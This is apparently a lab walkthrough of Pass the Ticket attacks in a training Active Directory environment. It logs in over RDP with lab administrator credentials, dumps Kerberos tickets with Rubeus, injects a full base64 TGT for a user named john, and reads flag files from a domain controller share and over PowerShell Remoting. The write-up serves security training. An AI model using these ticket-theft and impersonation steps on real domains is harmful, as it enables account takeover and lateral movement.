## Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?

```
xfreerdp3 /u:Administrator /p:'AnotherC0mpl3xP4$$' /v:10.129.204.23
cd c:\tools
Rubeus.exe dump /nowrap
```

## Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john

![Снимок экрана 2026-02-01 в 20.30.41](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-02-01%20%D0%B2%2020.30.41.png)

```
Rubeus.exe ptt /ticket:doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6X5e1we+oTIkDs8v5BWNeS+gX3sv1yv5YfW3z/3lazioK/lc6Dlg2m8eZKfTZREKzwB8iBtJl2dn/hJUBd60vTgGePF0w+vRYo71BkdeR5ksnT1Dw3iijlH2rfEhOXV3CUNi63Od2TLlxEjqvbYoGpbV79tTTWzNyOQo7JuVC5x7+iS4ejLriK6owzIJ0q+eu4SKbcyfQCoD3joXBVVoKFnPxVgFaIcFwSDOPK8VeXE5dkRX5mv0wgWzBXBiPWTUxFUlvPMHnIgV8FMXBgrr70K97T6CyBvW40O/OzwAJmfu8u6c92fphayxa15/BEDtwOphG37pVMUlDNLG5q+r80zYXuItyx5FF+WB0ex9CnlO+fDmr5cLO1CD0bwqNREGdGyo/EMqVcWcEtE8EWJkrqv9XYMz/aszSUE0J4or30QwQxSAV54LSREhZe0RGpR4z4LtXlN70/s5Gzyp2ohIPzahuCyOin87PMd0GcAbXdfUDiz+MePFqDm7fToLi+JpkT8bAcrcgfkAmlnwKzgui/epfaSE04hA4MorWBf4NSRJK9Pqmw2ssWaMdJmrxU2J8AuioR9RknIeY6auRvp6xdphPZ3NEH4zQNsBSpYcf4IFd61t+WAo9k98E2AOPdFdMbxoPLXUIq6Gn0LsVRA+s9/neD9QWtdSIHKK2fITb1Hl3ebFQsTjMsICCTsY1vKclYVo0hYG2BpjFHqyIBmV3zfFwSyUANN24UH3E2Q00MAx2wX7IzZLUuKBDKRFmxWeIj4rrEtrBeaVlOY2EcOe37SPLG9X0+2gbidyhY88/xsB8wjHGyPpBojnVvGH5sD0Xjl2DQPoxBjv9sJSB/a6fW9Od1dkTqKmpsGj/xLsGGfy8G550xz+GffYb7Dz1u1v7gZWG78ityVsrDlvhjxHXttypa0g/AeNBN4F/ve/Ax/TvwCTxViEdRfTViN7tQy23xSNWembjaadGIEN635H3zj2XXlpH7rlYfKZKqgoZeUeQcOEtls7yE5Py0HZuuLLkBaeyVWYC0vmzSquqNHT9VNiZeSoZaJRllUPrg4B7SqceIKQlFzm1zL+dTjsd/5hB+olRMmKMcDivBJYFwFlt5eVt9I4hQs+lCPG5AF2mmxdumTk+HLOG83X4a9OW9JXk15tyhqDvJCTcZPueMAN6fPZ+pzK1o4SOZeN5P+SGJY97jlISVphH2ILxtocGj/7ZqUAdxYxx7rckdpzK/q4HChIaNSnqD4P6JTQbxa0T565/qo/Z0q3ERRab0cgnVb5ddIGYcHNsmkBvhG84hiL7amVsUXGxfutMe7h2cgl/lD8mvg1wynQ4kxtcIWYPynZhJfUWI6wbs4UEbxI/vNEbfHuqsy1+O2mLQufeLUT8vKoHVvb5dBPqP2TnuDkjVkgBI7Os6hv5qYl6DZR//ZotbZ9x2B9kGpJhiZGjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCBiopsgy68B4aQJZEkYxSXrOY2ZFu93e5gYGldClUlscKETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNjAyMDExODE4MDFaphEYDzIwMjYwMjAyMDQxODAxWqcRGA8yMDI2MDIwODE4MTgwMVqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC
```
![Снимок экрана 2026-02-01 в 20.35.38](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-02-01%20%D0%B2%2020.35.38.png)

```
dir \\DC01.inlanefreight.htb\john
type \\DC01.inlanefreight.htb\john\john.txt
```
![Снимок экрана 2026-02-01 в 20.38.11](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-02-01%20%D0%B2%2020.38.11.png)


## Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

```
powershell
Enter-PSSession -ComputerName DC01.inlanefreight.htb
cat C:\john\john.txt
```
![Снимок экрана 2026-02-01 в 20.42.56](assets/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA%20%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0%202026-02-01%20%D0%B2%2020.42.56.png)


## Optional: Try to use both tools, Mimikatz and Rubeus, to perform the attacks without relying on each other. Mark DONE when finish.